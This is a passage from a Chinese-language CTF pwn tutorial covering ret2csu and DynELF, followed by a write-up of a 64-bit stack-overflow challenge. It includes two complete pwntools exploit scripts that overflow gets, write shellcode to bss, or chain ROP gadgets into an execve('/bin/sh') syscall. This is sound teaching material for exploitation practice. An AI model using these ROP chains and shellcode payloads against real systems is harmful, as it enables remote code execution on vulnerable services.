        sleep(1)
这是ctf wiki的脚本,但是并没有具备全兼容性性,
所以我们平时一定要看清楚程序编译的`__libc_csu_init`的具体的初始化流程,然后修改下自己的csu的参数和位置。
**个人的一些看法:**
这个点也是我觉得萌新应该花时间去理解的，要不然只会套脚本，很容易把自己给坑死了。因为在pwn的过程中，环境很大概率会出现各种各样的问题，自己一定要掌握原理和调试的能力去解决这些问题。
## 0x3 dynELF
前面我们的思路一直是寻找确切的libc的本地版本与远程版本进行对应，但是在一些特殊情况下，这种方式是行不通的，本地能通，远程爆炸。这个时候dynELF技术就能解决这类型的一些问题，通过直接dump内存，去寻找libc的中函数地址，在远程的环境中运行。
###  0x3.1 浅析原理
这个内容涉及比较深的知识点，鉴于文章篇幅，先挖个坑，后面补上。
## 0x4 网鼎杯白虎组of F WP
最后我们用一道CTF的真题来完结我们的文章吧,据小伙伴说这是一道非常好的64位ROP的题目。
网上也没有什么写这个文章，估计有不少小伙伴想试试的，这里我就以这道题目为例简单运用下ret2csu的思路。
1.checksec
emm,没开保护,64位程序，
2.ida
很明显一个gets的栈溢出点
    cyclic 200
    cyclic -l faab
确定了偏移是120,开了NX,用了gets,先看看能不能shellcode一把梭。
`objdump -D pwn -M intel |grep "jump"`
发现没有用到`jump`的相关指令,这就无语了,我们没办法直接跳到shellcode
上执行了，因为你不知道栈的内存地址呀，跳不过去，要是有jump指令的话我们就能控制rip回到栈上向下执行。
存在`__lib_csu_init`满足万能gadget的条件,目前我们还能知道的一个点就是这个程序漏洞是由`gets`这个函数导致的，所以我们可以用`gets`来进行任意内容的写入，同时通过查阅程序内的函数，在`init`函数中发现了syscall的调用
整理上面的条件
这里有两种思路我们来看看:
###  0x3.1 bss段写入shellcode
gdb下用vmmap查看下发现bss段有rwx权限
这里就很简单了,直接用gets写入shellcode,然后ret2csu到call的时候执行bss地址即可。
`ROPgadget --binary pwn --only "pop|ret"` 找一下发现有pop rdi这样我们就很方便控制`gets`了
exp:
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    # from libformatstr import *
    debug = True
    # 设置调试环境
    context(log_level = 'debug', arch = 'amd64', os = 'linux')
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    if debug:
        sh = process("./pwn")
        elf=ELF('./pwn')
    else:
        link = "x.x.x.x:xx"
        ip, port = map(lambda x:x.strip(), link.split(':'))
        sh = remote(ip, port)
        elf=ELF('./quantum_entanglement')
    rc = lambda: sh.recv(timeout=0.5)
    ru = lambda x:sh.recvuntil(x, drop=True)
    bss_addr = elf.bss()
    gets_plt_addr = elf.plt["gets"]
    pop_rdi_addr = 0x4006a3
    shell_code = asm(shellcraft.amd64.linux.sh())
    log.success("bss_addr => {}".format(hex(bss_addr)))
    log.success("gets_plt_addr => {}".format(hex(gets_plt_addr)))
    log.success("pop_rdi_addr => {}".format(hex(pop_rdi_addr)))
    offset = 0x78
    payload = offset * "A" + p64(pop_rdi_addr) + p64(bss_addr) + p64(gets_plt_addr) + p64(bss_addr)
    # pause()
    # gdb.attach(sh, "*0x400633")
    sh.sendline(payload)
    sh.sendline(shell_code)
    rc()
    sh.interactive()
这里没什么太大的难点,关键的构造
    payload = offset * "A" + p64(pop_rdi_addr) + p64(bss_addr) + p64(gets_plt_addr) + p64(bss_addr)
应该还是很好理解的吧，调用`gets`把shellcode写入到bss段,然后返回到bss段的地址上执行shellcode
###  0x3.2 syscall系统调用
这个小伙伴说的他做的这个可能是非预期，比如开了NX保护的时候，bss段就没办法执行了,但是还是有读取的权限和写权限的话，那么通过一个ROP绕过NX保护即可，很实用的一个ROP操作，下面看我分析吧。
**了解syscall系统调用**
> execve(”/bin/sh”,0,0) 这个函数其实就是对系统函数的一个封装
>  
>  
>     mov     rdi,offset bss
>     mov     rsi,0
>     mov     rdx,0
>     mov     rax,3bh
>            syscall        ;因为rax为3b，所以执行execve("/bin/sh",0,0)
>  
>
> 其流程如下
>
> 1、将 sys_execve 的调用号 0x3B (59) 赋值给 rax  
>  2、将 第一个参数即字符串 “/bin/sh”的地址 赋值给 rdi  
>  3、将 第二个参数 0 赋值给 rsi  
>  4、将 第三个参数 0 赋值给 rdx
首先我们可以通过ret2csu来控制rsi、rdx,然后通过`gets`向bss段写入`syscall` 和`binsh`
但是rax的话,由前面可以知道ret2csu只能的控制的寄存器只有:
    rbx rbp r12 r13(rdx) r14(rsi) r15d(edi)
好像并没有控制rax的方法,这里我们找找gadget链条,并没有。
这个时候就是知识的力量了
> read函数原型：
>
> ​ ssize_t read(int fd,void *buf,size_t count)
>
> 函数返回值分为下面几种情况：
>
> 1、如果读取成功，则返回实际读到的字节数。这里又有两种情况：一是如果在读完count要求字节之前已经到达文件的末尾，那么实际返回的字节数将
> 小于count值，但是仍然大于0；二是在读完count要求字节之前，仍然没有到达文件的末尾，这是实际返回的字节数等于要求的count值。
>
> 2、如果读取时已经到达文件的末尾，则返回0。
>
> 3、如果出错，则返回－1。
我们可以调用read函数读取0x3b长度的自己,然后返回的时候rax会返回0x3b的,然后再调用syscall就可以了。
我们想调用read的时候需要控制rax=0,这个程序刚好满足。
**编写exp:**
首先回到ret2csu上面,根据程序指令我们可以确定csu函数如下结构
结合syscall的指令,后面的gadget用了`retn`
这里我们就不需要填充到0x38,然后继续向下执行了,直接拼接在后面即可。
    def csu(rbx, rbp, r12, r13, r14, r15, last):
        # pop rbx,rbp,r12,r13,r14,r15
        # rbx should be 0,
        # rbp should be 1,enable not to jump
        # r12 should be the function we want to call
        # rdi=edi=r15d
        # rsi=r14
        # rdx=r13
        payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
            r13) + p64(r14) + p64(r15)
        payload += p64(csu_front_addr)
        return payload
完整的EXP如下:
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    # from libformatstr import *
    debug = True
    # 设置调试环境
    context(log_level = 'debug', arch = 'amd64', os = 'linux')
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    if debug:
        sh = process("./pwn")
        elf=ELF('./pwn')
    else:
        link = "x.x.x.x:xx"
        ip, port = map(lambda x:x.strip(), link.split(':'))
        sh = remote(ip, port)
        elf = ELF('./quantum_entanglement')
    se = lambda x:sh.send(x)
    sl = lambda x: sh.sendline(x)
    rc = lambda: sh.recv(timeout=0.5)
    ru = lambda x:sh.recvuntil(x, drop=True)
    rn = lambda x:sh.recv(x)
    un64 = lambda x: u64(x.ljust(8, 'x00'))
    un32 = lambda x: u32(x.ljust(3, 'x00'))
    def csu(rbx, rbp, r12, r13, r14, r15, last):
        # pop rbx,rbp,r12,r13,r14,r15
        # rbx should be 0,
        # rbp should be 1,enable not to jump
        # r12 should be the function we want to call
        # rdi=edi=r15d
        # rsi=r14
        # rdx=r13
        global csu_end_addr
        global csu_front_addr
        payload = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
            r13) + p64(r14) + p64(r15)
        payload += p64(csu_front_addr)
        return payload
    csu_end_addr = 0x000000000040069A
    csu_front_addr = 0x0000000000400680
    bss_addr = elf.bss()+0x20
    gets_plt_addr = elf.plt["gets"]
    pop_rdi_addr = 0x4006a3
    syscall_addr = 0x40061A
    start = 0x4004F0
    log.success("bss_addr => {}".format(hex(bss_addr)))
    log.success("gets_plt_addr => {}".format(hex(gets_plt_addr)))
    log.success("pop_rdi_addr => {}".format(hex(pop_rdi_addr)))
    log.success("csu_end_addr => {}".format(hex(csu_end_addr)))
    log.success("csu_front_addr => {}".format(hex(csu_front_addr)))
    offset = 0x78
    payload1 = offset * "A" + p64(pop_rdi_addr) + p64(bss_addr) + p64(gets_plt_addr) + 
               p64(start)
    # pause()
    # gdb.attach(sh, "b *0x400633")
    # pause()
    sl(payload1)
    sl(p64(syscall_addr))
    payload2 = offset * "A" + p64(pop_rdi_addr) + p64(bss_addr+8) + p64(gets_plt_addr) + 
               p64(start)
    sl(payload2)
    sl("/bin/shx00")
    payload3 = offset * "A"
    payload3 += csu(0, 1, bss_addr, 59, bss_addr+0x20, 0, start)
    payload3 += csu(0, 1, bss_addr, 0,  0, bss_addr+8, start)
    sl(payload3)
    sl("A"*58)
    sh.interactive()
这里主要是利用了`read(0, bss_addr+0x20), 59)`,然后传入值,即可控制rax的返回值为0x
3b.
这个考点的原理是从SROP中发散出来的,平时没什么人注意，这个可以认真学习一波,不过这里的csu用的还是很巧妙的，能很好地多次刷新寄存器的值，来调用函数。
## 0x5 总结
栈上的套路还是有很多的,如一些地址残余在栈上、其他变形利用等等，路漫漫其修远兮，只能通过以赛促练来提高自己了。本来打算把dynelf写写，但是发现dynelf网上的文章原理方面介绍比较难理解，所以打算将其作为一个专题来认真学习下,然后再学习下SROP的知识,最终以一篇总结性文章收尾。
## 0x6 参考链接
[Linux pwn从入门到熟练（三）](https://desword.github.io/2019/10/29/linux-pwn-basic-3/)
[菜鸟学PWN之ROP学习](//www.killshadow.xyz/2019/06/06/1.2-%E8%8F%9C%E9%B8%9F%E5%AD%A6PWN%E4%B9%8BROP%E5%AD%A6%E4%B9%A0/))
[详解 De1ctf 2019
pwn——unprintable](https://www.anquanke.com/post/id/183859#h3-3)
[ret2csu学习](https://bbs.pediy.com/thread-257546.htm)
[Linux X86 程序启动 – main函数是如何被执行的？](https://luomuxiaoxiao.com/?p=516)
[Pwntools之DynELF原理探究](https://www.freebuf.com/articles/system/193646.html)
[Memory Leak & DynELF](https://www.jianshu.com/p/2405d137ca04)
[浅析栈溢出遇到的坑及绕过技巧](https://zhuanlan.zhihu.com/p/99321839)
[pwn BackdoorCTF2017 Fun-Signals](https://firmianay.gitbooks.io/ctf-all-in-one/doc/6.1.4_pwn_backdoorctf2017_fun_signals.html)